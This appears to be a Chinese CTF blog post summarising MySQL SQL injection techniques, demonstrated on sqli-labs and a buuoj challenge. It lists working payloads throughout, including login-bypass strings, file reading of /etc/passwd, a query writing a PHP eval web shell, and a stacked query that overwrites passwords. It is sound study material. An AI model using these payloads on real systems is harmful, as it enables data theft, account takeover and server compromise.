<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>sql注入总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">sql注入总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">2022-11-22</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于这个漏洞，非常经典，但是考点又及其多，之前一直学的模模糊糊，遇到困难的地方就难以下手，故这里总结一下思路，参考了很多大佬的文章，十分感谢</p>
<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。<br>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等<br>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。<br>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p>
<h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><p> information_schema包含了大量有用的信息，例如下图 :<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png" alt="zawirg523g.png"><br>常用语句:</p>
<pre><code class="python">#sql
当前用户：select user()
数据库版本：select version() , select @@version
数据库名：select database()
操作系统：select @@version_compile_os
所有变量：show variables
单个变量：select @@secure_file_priv , show variables like &#39;secure_file_%&#39;
爆字段数：order by 1... ，group by 1...
查库名：select group_concat(schema_name) from information_schema.schemata
查表名：select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;
查字段：select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;
读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）
# mysql.user下有所有的用户信息，其中authentication_string为用户密码的hash，如果可以使用可以修改这个值，那么就可以修改任意用户的密码
读文件：select load_file(&#39;/etc/passwd&#39;)
写文件：select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;/var/www/html/a.php&#39;  //该处文件名无法使用16进制绕过
</code></pre>
<h1 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h1><h2 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h2><pre><code class="python">order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/
</code></pre>
<h2 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h2><pre><code class="python"># 在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中
select null,null,schema_name from information_schema.schemata
</code></pre>
<h2 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h2><pre><code class="python">select null,null,...,database()
</code></pre>
<h2 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h2><pre><code class="python">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()
# 或
select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
</code></pre>
<h2 id="获取表中字段"><a href="#获取表中字段" class="headerlink" title="获取表中字段"></a>获取表中字段</h2><p> 这里假设已经获取到表名为user  </p>
<pre><code class="python">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;
</code></pre>
<h2 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h2><p> 这里假设已经获取到表名为user，且字段为username和password  </p>
<pre><code class="python">select null,group_concat(username,password) from users
</code></pre>
<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>正常查询语句如下:</p>
<pre><code class="python">mysql_query(&quot;select username from users where id=&#39;$_GET[&#39;id&#39;]&#39; &quot;);
</code></pre>
<p>我们可以构造万能密码:</p>
<pre><code class="python">&#39; or &#39;1&#39;=&#39;1　　　　　　　　//完整语句 select username where id=&#39;&#39; or &#39;1&#39;=&#39;1&#39;
&#39; or 1=1#　　　　　　　　　//完整语句 select username where id=&#39;&#39; or 1=1#&#39;
&#39;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#39;&#39;=0#
</code></pre>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><pre><code class="python">xx&#39; union select 1,(select database())#
</code></pre>
<pre><code class="python">mysql&gt; select * from users where id=-1 union select 1,user(),3;
+----+----------------+----------+
| id | username       | password |
+----+----------------+----------+
|  1 | root@localhost | 3        |
+----+----------------+----------+
1 row in set (0.00 sec)
</code></pre>
<h1 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h1><p>substr(str,start,long)<br>str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度<br>if(exp1,exp2,exp3)<br>如果满足exp1,那么执行exp2,否则执行exp3<br>payload:</p>
<pre><code class="python">xx&#39; or if((substr((select database()),1,1)=&#39;c&#39;),1,0) #　　　　//判断数据库第一个字符是否为c
xx&#39; or if((substr((select database()),2,1)=&#39;t&#39;),1,0) #　
</code></pre>
<p>假设 , (逗号)被过滤了，可以用如下方式处理<br>if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end<br>substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p>
<pre><code class="python">xx&#39; or case when (substr((select database()) from 1 for 1)=&#39;c&#39;) then 1 else 0 end #
</code></pre>
<p> 假设substr被过滤了，可以用如下方式处理<br>LOCATE(substr,str,pos)<br>返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0<br>ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p>
<pre><code class="python">xx&#39; or if((locate(binary&#39;c&#39;,(select database()),1)=1),1,0) #
xx&#39; or if((locate(binary&#39;t&#39;,(select database()),1)=2),1,0) #
</code></pre>
<h1 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h1><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>方法：sleep，benchmark， 笛卡尔积等</p>
<pre><code class="python">#基于sleep的延迟 
xx&#39; or if(length((select database()))&gt;1,sleep(5),1) 
#基于笛卡尔乘积运算时间造成的时间延迟
xx&#39; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) 
# 基于benchmark的延迟 
xx&#39;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1) #--大概会用2S时间
</code></pre>
<pre><code class="python"># sleep
mysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,sleep(2),1);
Empty set (4.02 sec)
# benchmark
mysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1);
Empty set (1.40 sec)
</code></pre>
<p> benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟  </p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容<br>报错注入函数很多<br><strong>1 floor()和rand()</strong></p>
<pre><code class="python">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png" alt="image.png"><br><strong>2 extractvalue()</strong><br>updatexml一样，限制长度也是32位。</p>
<pre><code class="python">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png" alt="image.png"><br><strong>3 updatexml()</strong><br>updatexml（）这个函数最多只能爆32位字符，如果要爆的数据超过了这个位数，可以加上使用limit 0,1来查询后面数据。</p>
<pre><code class="python">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png" alt="image.png"><br><strong>4 geometrycollection()</strong></p>
<pre><code class="python">id=1 and geometrycollection((select * from(select * from(select user())a)b))
</code></pre>
<p> 5.5&lt;mysql版本&lt;5.6<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png" alt="image.png"><br>后面几个用法一模一样，不再示范！<br><strong>5 multipoint()</strong></p>
<pre><code class="python">id=1 and multipoint((select * from(select * from(select user())a)b))
</code></pre>
<p><strong>6 polygon()</strong></p>
<pre><code class="python">id=1 and polygon((select * from(select * from(select user())a)b))
</code></pre>
<p><strong>7 multipolygon()</strong></p>
<pre><code class="python">id=1 and multipolygon((select * from(select * from(select user())a)b))
</code></pre>
<p><strong>8 linestring()</strong></p>
<pre><code class="python">id=1 and linestring((select * from(select * from(select user())a)b))
</code></pre>
<p><strong>9 multilinestring()</strong></p>
<pre><code class="python">id=1 and multilinestring((select * from(select * from(select user())a)b))
</code></pre>
<p><strong>10 exp()</strong></p>
<pre><code class="python">id=1 and exp(~(select * from(select user())a))
</code></pre>
<h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p>
<pre><code class="python">mysql&gt; select * from users where id=1;select * from users where id =2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  2 | Angelina | I-kill-you |
+----+----------+------------+
1 row in set (0.00 sec)
</code></pre>
<p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
<pre><code class="python">    目标存在sql注入漏洞
    目标未对&quot;;&quot;号进行过滤
    目标中间层查询数据库信息时可同时执行多条sql语句
</code></pre>
<p><strong>实例:sqllibs Less-38:</strong><br> 经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png" alt="image.png"><br>我们来修改下这个用户的密码试试:</p>
<pre><code class="python">http://127.0.0.1/sqli-labs/Less-38/?id=-1&#39;union select 1,username,password from users limit 1,1;update users set password=666 where id=2;--+
</code></pre>
<p>我们再来查询下,密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png" alt="image.png"><br>如果select被过滤。可以搭配desc来读取表的字段<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png" alt="image.png"></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用条件:</p>
<ul>
<li>[查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li>
<li>数据库的编码为GBK</li>
</ul>
<p>payload:</p>
<pre><code class="python">id = -1%df&#39; union select 1,user(),3,%23
</code></pre>
<p>当我们输入payload时，会在我们输入的单引号前加一个转义字符,就成了这样:</p>
<pre><code class="python">id = -1%df\&#39; union select 1,user(),3,%23
</code></pre>
<p> 在 其中\的十六进制是%5c ,所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。<br> 用sqli-labs靶场进行演示，这里利用32关进行练习<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png" alt="image.png"><br>加单引号没有反应，加上%df<br>成功报错<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png" alt="image.png"><br>后面的就正常查询即可，这里不再演示</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png" alt="40cf06a986854c5eb85bd683f9b15553.png"><br>例题:<strong>sql-labs 24</strong><br>我们直接看源码，这是修改密码的部分:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png" alt="image.png"><br>如果我们输入的username变为:</p>
<pre><code class="python">admin&#39;#
那么sql语句就被截断为:
UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39;#
</code></pre>
<p>这样就不再需要旧密码，我们来操作一下<br>注册一个账号:</p>
<pre><code class="python">账号: admin&#39;#
密码: 123456
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png" alt="image.png"><br>我们看下数据库:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png" alt="image.png"><br>已经增加了用户进去,我们来修改下密码<br>旧密码就随便填一个了，然后输入我们的新密码 HY666<br>我们再看数据库，惊奇的发现admin的密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png" alt="image.png"></p>
<h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><p>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假(0)，两个条件不同即为真(1)，null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。<br>mysql里异或运算符为^ 或者 xor<br><strong>两个同为真的条件做异或，结果为假</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png" alt="image.png"><br>** 两个同为假的条件做异或,结果为假**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png" alt="image.png"><br>** 一个条件为真,一个条件为假,结果为真**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png" alt="image.png"><br>** null与任何条件（真、假、null）做异或,结果都为null **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png" alt="image.png"></p>
<p>^和xor是有区别的<br>** ^运算符会做位异或运算 如1^2=3  **</p>
<pre><code class="python">mysql&gt; select 1^2;
+-----+
| 1^2 |
+-----+
|   3 |
+-----+
1 row in set (0.00 sec)

mysql&gt; select 1^1;
+-----+
| 1^1 |
+-----+
|   0 |
+-----+
1 row in set (0.00 sec)
</code></pre>
<p>** xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据  **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png" alt="image.png"></p>
<h1 id="使用handler进行注入"><a href="#使用handler进行注入" class="headerlink" title="使用handler进行注入"></a>使用handler进行注入</h1><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。<br>句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）</p>
<pre><code class="python"># 打开一个表名为 tbl_name 的表的句柄
HANDLER tbl_name OPEN [ [AS] alias]

# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]

# 2、通过索引查看表
# FIRST: 获取第一行（索引最小的一行）
# NEXT: 获取下一行
# PREV: 获取上一行
# LAST: 获取最后一行（索引最大的一行）
HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
    [ WHERE where_condition ] [LIMIT ... ]

# 3、不通过索引查看表
# READ FIRST: 获取句柄的第一行
# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果
HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
    [ WHERE where_condition ] [LIMIT ... ]

# 关闭已打开的句柄
HANDLER tbl_name CLOSE
</code></pre>
<pre><code class="python">例如,现在已知一张表名为tablename：
handler tablename open;
handler tablename read frist;
handler tablename close;
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png" alt="image.png"><br><strong>[强网杯 2019]随便注</strong><br>查表:<br>经过测试，存在堆叠注入</p>
<pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;show%20tables;%23
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png" alt="image.png"><br>进一步测试，发现select被过滤<br>使用desc查一些表:</p>
<pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;desc%20`1919810931114514`;%23
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png" alt="image.png"><br>后面就使用handler读数据:<br>最终payload:</p>
<pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;%23
</code></pre>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><h2 id="当information-schema库被禁用"><a href="#当information-schema库被禁用" class="headerlink" title="当information_schema库被禁用"></a>当information_schema库被禁用</h2><p> 在手工SQL注入时，我们常常会想着利用 information_schema库 来进行爆数据库名、表名、字段名，但如果 information_schema库 被禁用了怎么办？<br><strong>1. sys数据库</strong><br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名.<br>** 对表自增ID的监控  :**</p>
<ul>
<li>sys.schema_auto_increment_columns</li>
</ul>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png" alt="image.png"><br>我们可以利用这个表来读取表名:</p>
<pre><code class="python">mysql&gt; select table_name from sys.schema_auto_increment_columns;
+--------------------------------+
| table_name                     |
+--------------------------------+
| zzcms_looked_dls               |
| zzcms_ask                      |
| zzcms_usersetting              |
| message                        |
| zzcms_pinglun                  |
...
</code></pre>
<p> 但是 sys.schema_auto_increment_columns这个库有些局限性，一般要超级管理员才可以访问sys。<br>**查询表的统计信息，其中还包括Innodb缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间）降序排序  **</p>
<ul>
<li>sys.schema_table_statistics_with_buffer</li>
<li>sys.x$schema_table_statistics_with_buffer</li>
<li>…</li>
</ul>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png" alt="image.png"></p>
<pre><code class="python">mysql&gt; select table_name from sys.schema_table_statistics_with_buffer;
+--------------------------------+
| table_name                     |
+--------------------------------+
| users                          |
| sys_config                     |
| pwmm2nzea4                     |
| httpinfo                       |
| member                         |
| message                        |
| users                          |
...
</code></pre>
<pre><code class="python">mysql&gt; select table_name from sys.x$schema_table_statistics_with_buffer;
+--------------------------------+
| table_name                     |
+--------------------------------+
| users                          |
| httpinfo                       |
| zzcms_askclass                 |
| zzcms_msg                      |
| zzcms_wangkan                  |
| emails                         |
| zzcms_help                     |
</code></pre>
<p><strong>2.InnoDb引擎</strong><br> 从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>mysql.innodb_index_stats、mysql.innodb_table_index同样存放有库名表名  </p>
<ul>
<li>mysql.innodb_table_stats</li>
</ul>
<pre><code class="python">mysql&gt; select table_name from mysql.innodb_table_stats;
+---------------+
| table_name    |
+---------------+
| gtid_executed |
| sys_config    |
+---------------+
2 rows in set (0.00 sec)
</code></pre>
<ul>
<li>mysql.innodb_index_stats</li>
</ul>
<pre><code class="python">mysql&gt; select table_name from mysql.innodb_index_stats;
+---------------+
| table_name    |
+---------------+
| gtid_executed |
| gtid_executed |
| gtid_executed |
| gtid_executed |
| sys_config    |
| sys_config    |
| sys_config    |
+---------------+
7 rows in set (0.00 sec)
</code></pre>
<p>不过这些表里内容并不是很全<br>不过我们通过以上这些库也仅仅可以知道它们的表名而已，那么我们如何注出它们的字段名呢，这里我们就要引入无列名注入。</p>
<h2 id="取别名绕过列名查数据"><a href="#取别名绕过列名查数据" class="headerlink" title="取别名绕过列名查数据"></a>取别名绕过列名查数据</h2><p><strong>正常查询</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png" alt="image.png"><br><strong>将列名转换为任何可选的已知值</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png" alt="image.png"><br>此时我们发现列名变为1,2,3 受我们所控制<br><strong>代替列名读取数据</strong><br> 像这样就可以查询第二列的数据，在虚拟表中，列名都是1，2，3，所以我们在查询语句中要用 <code>2</code> 而不能直接用 2<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png" alt="image.png"><br>取别名也可以直接在后面加<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png" alt="image.png"><br><strong>注入payload</strong></p>
<pre><code class="python">-1&#39;union select 1,(select group_concat(b) from(select 1 as a,2 as b,3 as c union select * from users)as m),3#
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png" alt="image.png"></p>
<h2 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h2><p>需要有回显才能使用<br>由于join是将两张表的列名给加起来，所以有可能会产生相同的列名，而在使用别名时，是不允出现相同的列名的，因此当它们两个一起使用时，就会爆出相同的列名的名称，从而获得列名<br><strong>正常查询</strong></p>
<pre><code class="python">mysql&gt; select * from users where id=-1;
Empty set (0.00 sec)
</code></pre>
<p><strong>使用join连接爆出相同列名的名称</strong></p>
<pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b) as c;
ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
</code></pre>
<p><strong>爆出剩余的列名名称</strong></p>
<pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id)) as c;
ERROR 1060 (42S21): Duplicate column name &#39;username&#39;
---------------------
mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id,username)) as c;
ERROR 1060 (42S21): Duplicate column name &#39;password&#39;
</code></pre>
<p>这样所有字段全部都暴出来了<br><strong>注入payload</strong></p>
<pre><code class="python"># 获取第一个列名
-1&#39; union all select * from (select * from users as a join users as b)as c#
# 获取下一个列名
-1&#39; union all select*from (select * from users as a join users as b using(username))as c#
</code></pre>
<h2 id="字符比较查询"><a href="#字符比较查询" class="headerlink" title="字符比较查询"></a>字符比较查询</h2><p>要知道比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0  </p>
<pre><code class="python">mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;a&#39;);
+---------------------------+
| (select &#39;f&#39;)&gt;(select &#39;a&#39;) |
+---------------------------+
|                         1 |
+---------------------------+
